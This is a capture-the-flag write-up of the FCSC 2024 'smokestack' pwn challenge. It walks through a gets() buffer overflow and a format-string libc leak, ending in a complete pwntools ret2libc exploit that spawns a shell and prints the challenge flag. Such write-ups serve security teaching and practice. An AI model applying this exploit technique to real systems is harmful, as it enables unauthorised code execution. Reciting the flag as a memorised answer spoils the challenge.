+++
type               = "ctf"
title              = "smokestack"
author             = "conflict"
date               = "2024-04-14"
language           = "en"
tags               = ["pwn", "stack", "ret2libc", "aslr"]
event              = "FCSC 2024"
category           = "pwn"
difficulty         = "medium"
solves             = 38
challenge_author   = "erdnaxe"
challenge_author_url = "https://twitter.com/erdnaxe"
rating             = 7
flag               = "FCSC{4_cl4ss1c_r3t2l1bc_w1th_4_tw1st}"
pinned             = true
+++

## Overview

`smokestack` is a classic stack-based buffer overflow challenge with ASLR enabled but no PIE. The binary leaks a libc address through a format string, which we use to compute the base address and jump to `system("/bin/sh")`.

Protections:

| Protection | Status |
|---|---|
| ASLR | Enabled |
| NX | Enabled |
| PIE | Disabled |
| Stack canary | Disabled |

## Reconnaissance

```terminal
$ file smokestack
smokestack: ELF 64-bit LSB executable, x86-64, dynamically linked
$ checksec --file=smokestack
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ ./smokestack
What's your name? AAAA
Hello, AAAA!
Leave a message: 
```

Running it with a long input:

```terminal
$ python3 -c "print('A'*200)" | ./smokestack
What's your name? Hello, AAAAAAAAAA...
Leave a message: Segmentation fault
```

The second input is the vulnerable one.

## Analysis

Decompiling in Ghidra, `main` calls two functions:

```c
void vuln(void) {
    char buf[64];
    printf("Leave a message: ");
    gets(buf);
}
```

Classic `gets` overflow — no bounds check, no canary. We control RIP after 72 bytes (`64` buffer + `8` saved RBP).

The first input uses `printf` directly with our input as the format string:

```c
printf("What's your name? ");
fgets(name, 0x20, stdin);
printf(name);  // format string vuln
```

## Exploit

The plan:

1. Leak a libc address using `%p` on the stack through the format string bug
2. Compute `libc_base = leak - offset`
3. Send the overflow payload: `'A' * 72 + ret_gadget + pop_rdi + bin_sh + system`

Finding the right stack offset for the leak:

```terminal
$ python3 -c "print('%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p')" | ./smokestack
What's your name? 0x7f4a2b3c1d80.0x1.(nil).0x7f4a2b0a0a03...
```

Offset 7 holds a stable libc pointer. Cross-referencing with the libc base in `/proc/self/maps`:

```terminal
$ python3 -c "print('%7$p')" | ./smokestack
What's your name? 0x7f4a2b0a0a03
```

```python
# offset from libc base to the leaked address
offset = 0x7f4a2b0a0a03 - 0x7f4a2b000000  # = 0xa0a03
```

Full exploit:

```python
from pwn import *

elf  = ELF('./smokestack')
libc = ELF('./libc.so.6')
p    = process('./smokestack')

# leak
p.sendlineafter(b'name? ', b'%7$p')
p.recvuntil(b'Hello, ')
leak     = int(p.recvline().strip(), 16)
libc_base = leak - 0xa0a03

log.info(f'libc @ {hex(libc_base)}')

libc.address = libc_base
system   = libc.sym['system']
bin_sh   = next(libc.search(b'/bin/sh'))
pop_rdi  = libc_base + 0x2a3e5   # ROPgadget
ret      = libc_base + 0x2a3e6

payload  = b'A' * 72
payload += p64(ret)       # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendlineafter(b'message: ', payload)
p.interactive()
```

## Shell

```terminal
$ python3 exploit.py
[*] libc @ 0x7f4a2b000000
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
FCSC{4_cl4ss1c_r3t2l1bc_w1th_4_tw1st}
```
